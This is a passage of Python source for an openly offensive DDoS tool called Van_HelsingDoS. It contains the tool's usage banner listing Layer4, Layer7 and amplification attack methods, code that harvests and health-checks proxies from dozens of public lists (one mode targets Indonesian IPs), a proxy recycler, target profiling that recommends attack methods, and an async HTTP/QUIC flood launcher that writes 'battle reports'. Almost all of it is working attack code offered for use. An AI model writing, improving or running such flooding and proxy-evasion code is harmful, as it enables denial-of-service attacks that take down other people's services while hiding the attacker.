                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* Van_HelsingDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    # [OPTIMIZED] Logic to Handle "No Proxy" Mode
    # If user passed '0' or 'None' as filename, we return None (Direct Attack)
    if str(proxy_li) in {"0", "None", "NONE", "none"}:
        return None

    if proxy_ty not in {4, 5, 1, 0, 6, 7}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6, 7]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if proxy_ty == 7: # [PHASE 7, 8 & 9] INDO-PROXY ARMAGEDDON (ULTIMATE EXPANSION)
        logger.info(f"{bcolors.OKCYAN}Activating MEGA-INDO-SCAVENGER: Hunting for EVERY available Indonesian IP...{bcolors.RESET}")
        sources = [
            # Standard Hubs
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=ID",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=ID",
            "https://www.proxy-list.download/api/v1/get?type=socks5&country=ID",
            "https://www.proxy-list.download/api/v1/get?type=https&country=ID",
            # Specialized ID Repos
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_country/ID.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_country/ID.txt",
            "https://raw.githubusercontent.com/yuc0/proxy-list/main/country/ID.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt", # Generic but large
            "https://raw.githubusercontent.com/Zloi-User/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/UrielChaves/File-Proxy/master/Socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://proxyspace.pro/socks5.txt",
            "https://proxyspace.pro/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        ]
        scavenged_proxies = []
        for source in sources:
            try:
                with get(source, timeout=10) as r:
                    if r.status_code == 200:
                        lines = r.text.splitlines()
                        for line in lines:
                            if ":" in line:
                                try:
                                    # Extract IP:PORT
                                    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})', line)
                                    if match:
                                        p_str = match.group(1)
                                        scavenged_proxies.append(Proxy(p_str.split(":")[0], int(p_str.split(":")[1]), ProxyType.SOCKS5))
                                except: pass
            except: continue
        
        # Remove duplicates
        proxies = list(set(scavenged_proxies))
        if proxies:
            logger.info(f"{bcolors.OKCYAN}MEGA-SCAVENGE: Found {len(proxies):,} potential IPs. Filtering for Live ones...{bcolors.RESET}")
            # [UPGRADED] Real-time Target Latency Check
            proxies = list(ProxyChecker.checkAll(
                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                url=url.human_repr() if url else "http://www.google.id"
            ))
            logger.info(f"{bcolors.OKGREEN}Armageddon Results: {len(proxies):,} Live Indonesian Proxies ready for deployment.{bcolors.RESET}")
        return proxies
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=min(1000, len(Proxies)),
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    # [OPTIMIZED] ULTRA-HARDCORE PROXY LOADER (Van Helsing Edition)
    proxies = []
    if proxy_li.exists():
        with proxy_li.open("r") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
            import random
            
            # Map proxy_ty to correct enum if possible
            ptype_mapping = {1: 1, 4: 4, 5: 5} 
            default_ptype = ptype_mapping.get(proxy_ty, None)
            
            for line in lines:
                try:
                    # Dynamically assign proxy type if proxy_ty=7 (Mixed Pool) or randomly 
                    # This solves the 0 PPS bug where HTTP proxies drop SOCKS5 handshakes
                    current_ptype = default_ptype if default_ptype else random.choice([1, 4, 5])
                    
                    # Format: user:pass@host:port
                    if "@" in line:
                        auth, endpoint = line.split("@")
                        user, password = auth.split(":")
                        host, port = endpoint.split(":")
                        proxies.append(Proxy(host, int(port), current_ptype, user, password))
                    else:
                        # Fallback for IP:PORT
                        parts = line.split(":")
                        proxies.append(Proxy(parts[0], int(parts[1]), current_ptype))
                except Exception:
                    pass

    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
        logger.info(f"{bcolors.OKGREEN}Proxy Loaded Successfully via Hard-Bypass!{bcolors.RESET}")
    else:
        # [OPTIMIZED] AUTO-FAILOVER: SCAVENGER MODE
        logger.warning(f"{bcolors.FAIL}Primary Proxy File Failed or Empty! Activating Scavenger Mode...{bcolors.RESET}")
        logger.info(f"{bcolors.WARNING}Downloading Fresh Proxies from Public Sources...{bcolors.RESET}")
        
        # Fresh Sources (SYNCED WITH MENU.PY HARVESTER v4 — 80+ VERIFIED)
        sources = [
            # ===== TIER 1: MEGA SOURCES (10K+ each) =====
            "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt",
            # ===== TIER 2: HIGH-VOLUME (1K-10K each) =====
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
            "https://openproxylist.xyz/http.txt",
            "https://openproxylist.xyz/socks4.txt",
            "https://openproxylist.xyz/socks5.txt",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks4.txt",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks5.txt",
            "https://proxyspace.pro/http.txt",
            "https://proxyspace.pro/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
            # ===== TIER 3: MEDIUM (100-1K each) =====
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
            "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
            # ===== TIER 4: API ENDPOINTS =====
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all",
            # ===== TIER 5: CDN MIRRORS (proxifly via jsDelivr) =====
            "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
        ]
        
        scavenged_proxies = []
        for source in sources:
            try:
                # [PHASE 13] Detect Protocol from Source URL
                p_type = ProxyType.SOCKS5
                if "socks4" in source.lower(): p_type = ProxyType.SOCKS4
                elif "http" in source.lower() and "socks" not in source.lower(): p_type = ProxyType.HTTP
                
                with get(source, timeout=10) as r:
                    if r.status_code == 200:
                        lines = r.text.splitlines()
                        for line in lines:
                            line = line.strip()
                            if ":" in line:
                                try:
                                    parts = line.split(":")
                                    scavenged_proxies.append(Proxy(parts[0], int(parts[1]), p_type))
                                except: pass
            except Exception:
                continue

        # Remove duplicates
        proxies = list(set(scavenged_proxies))
        
        if proxies:
            logger.info(f"{bcolors.OKCYAN}Scavenged {len(proxies):,} proxies. Now Checking for Live ones... (This takes time){bcolors.RESET}")
            # [OPTIMIZED] Verify Scavenged Proxies
            proxies = list(ProxyChecker.checkAll(
                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                url="http://www.google.com" # Check against a reliable target
            ))
            logger.info(f"{bcolors.OKGREEN}Scavenged & Verified {len(proxies):,} Live Proxies!{bcolors.RESET}")
        else:
            logger.info(f"{bcolors.FAIL}Scavenger Failed. Running Direct Attack (DANGEROUS).{bcolors.RESET}")
            proxies = None

    return proxies


def proxy_recycler(proxies_list, con, proxy_li, proxy_ty, url=None):
    global IS_RECYCLING, RECYCLE_EVENT
    while True:
        RECYCLE_EVENT.wait()
        IS_RECYCLING = True
        logger.info(f"{bcolors.WARNING}Proxy Pool Exhausted or Health Low! RECYCLING Fresh IPs...{bcolors.RESET}")
        
        try:
            # Re-run scavenger
            new_proxies = handleProxyList(con, proxy_li, proxy_ty, url)
            if new_proxies:
                # Atomically update the shared list content
                global BURNED_PROXIES
                BURNED_PROXIES.clear()
                
                # Update the shared list
                proxies_list[:] = list(set(proxies_list + new_proxies))
                logger.info(f"{bcolors.OKGREEN}Recycle Success: Pool now has {len(proxies_list):,} total IPs.{bcolors.RESET}")
        except Exception as e:
            logger.error(f"Recycle Error: {e}")
        
        IS_RECYCLING = False
        RECYCLE_EVENT.clear()
        sleep(60) # Prevent rapid fire recycling


async def main_async():
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            
            # [FIX] Use threading.Event for thread-based HttpFlood, asyncio.Event for async tasks
            event = Event()  # threading.Event — compatible with both Thread.wait() and asyncio tasks
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"): urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found")

            if method in Methods.LAYER7_METHODS:
                origin_ip = None
                if "@" in urlraw:
                    parts = urlraw.split("@")
                    urlraw = parts[0]
                    origin_ip = parts[1].strip()

                url = URL(urlraw)
                host = url.host
                host_array = []

                if method != "TOR":
                    try:
                        if origin_ip: host_array = [origin_ip]
                        else:
                            import socket as sys_socket; info = sys_socket.getaddrinfo(url.host, 80)
                            host_array = list(set([str(ip[4][0]) for ip in info]))
                            if not host_array: raise Exception("No A-records")
                            host = host_array[0]
                    except Exception as e:
                        exit('Cannot resolve hostname: ' + str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                user_path = argv[5].strip()
                
                if user_path in {"0", "None", "NONE", "none"}: proxy_li = Path("0")
                else:
                    proxy_li = Path(user_path)
                    if not proxy_li.exists(): proxy_li = Path(__dir__ / "files/proxies/" / user_path)
                
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                proxies: Any = set()

                if not useragent_li.exists() or not referers_li.exists(): exit("Missing files")
                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())

                discovered_paths = Tools.crawl(urlraw)
                
                # [V8] Auto-detect target stack and suggest best methods
                logger.info(f"{bcolors.OKCYAN}[V8] Profiling target stack...{bcolors.RESET}")
                target_profile = TargetProfiler.profile(urlraw)
                logger.info(f"{bcolors.OKGREEN}[V8] Server: {target_profile['server']} | WAF: {target_profile['waf'] or 'None'} | CMS: {target_profile['cms'] or 'Unknown'}{bcolors.RESET}")
                logger.info(f"{bcolors.OKGREEN}[V8] Recommended Methods: {', '.join(target_profile['methods'])}{bcolors.RESET}")
                
                if method == 'CHAOS':
                    logger.info(f"{bcolors.WARNING}[V8] CHAOS MODE: Multi-vector attack engaged. Rotating methods dynamically.{bcolors.RESET}")
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                
                if proxies:
                    Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, url), daemon=True).start()
                    ProxyHealthChecker(proxies, interval=45).start()
                    PROXY_ALIVE_COUNT.set(len(proxies))

                tasks = []
                event.set()  # [FIX] Set event before creating tasks so threads start immediately
                
                if method in {"H2_FLOOD", "GET", "POST"}:
                    for thread_id in range(threads):
                        flood = AsyncHttpFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
                        flood.host_array = host_array
                        tasks.append(asyncio.create_task(flood._run_async()))
                elif method == "H3_QUIC":
                    for thread_id in range(threads):
                        flood = AsyncQuicFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
                        flood.host_array = host_array
                        tasks.append(asyncio.create_task(flood._flood_quic()))
                else:
                    # [FIX] Thread-based methods need run_in_executor to avoid blocking event loop
                    loop = asyncio.get_event_loop()
                    for thread_id in range(threads):
                        flood = HttpFlood(thread_id, url, host, method, rpc, event, uagents, referers, proxies)
                        flood.host_array = host_array
                        flood.crawled_paths = discovered_paths
                        tasks.append(loop.run_in_executor(None, flood.run))
                
                # Status Thread inside async
                async def display_status():
                    ts = time()
                    last_requests = 0
                    last_bytes = 0
                    while time() < ts + timer:
                         current_requests = int(REQUESTS_SENT)
                         current_bytes = int(BYTES_SEND)
                         pps = current_requests - last_requests
                         bps = current_bytes - last_bytes
                         print(f'\rTarget: {target or url.host} | Speed: {Tools.human_format(pps, "PPS")} | Data: {Tools.human_format(bps, "Bps")} | {round((time() - ts) / timer * 100, 1)}%  ', end="")
                         last_requests = current_requests
                         last_bytes = current_bytes
                         await asyncio.sleep(1)
                    print()
                    # [V36] Battle Report Generation
                    try:
                        target_str = target or url.host
                        safe_target = target_str.replace("https://", "").replace("http://", "").replace("/", "")[:15]
                        report_file = f"battle_report_{safe_target}.txt"
                        report_content = f"=== CHAOS BATTLE REPORT ===\nTarget: {target_str}\nTarget Status: Assumed Offline/Stressed\nDuration: {timer} seconds\nTotal Sent: {int(REQUESTS_SENT):,} requests\nData Egress: {Tools.human_format(int(BYTES_SEND), 'B')}\n===========================\n"
                        with open(report_file, "a", encoding="utf-8") as rf:
                            rf.write(report_content + "\n")
                        print(f"{bcolors.OKGREEN}[+] Battle Report saved -> {report_file}{bcolors.RESET}")
                    except: pass
                    import os; os._exit(0)
                tasks.append(asyncio.create_task(display_status()))
                await asyncio.gather(*tasks)

        ToolsConsole.usage()

if __name__ == '__main__':
    # [KALI] Platform-specific optimizations
    if IS_LINUX:
        import signal
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)  # Prevent broken pipe crashes
    
    if uvloop_status:
        print(f'{bcolors.OKGREEN}[OPTIMIZED] Using UVLOOP engine (Linux Extreme Performance){bcolors.RESET}')
    
    # Report FD limit
    try:
        import resource as _res
        _soft, _ = _res.getrlimit(_res.RLIMIT_NOFILE)
        print(f'{bcolors.OKCYAN}[SYSTEM] File Descriptor Limit: {_soft:,}{bcolors.RESET}')
    except ImportError:
        pass
    
    asyncio.run(main_async())
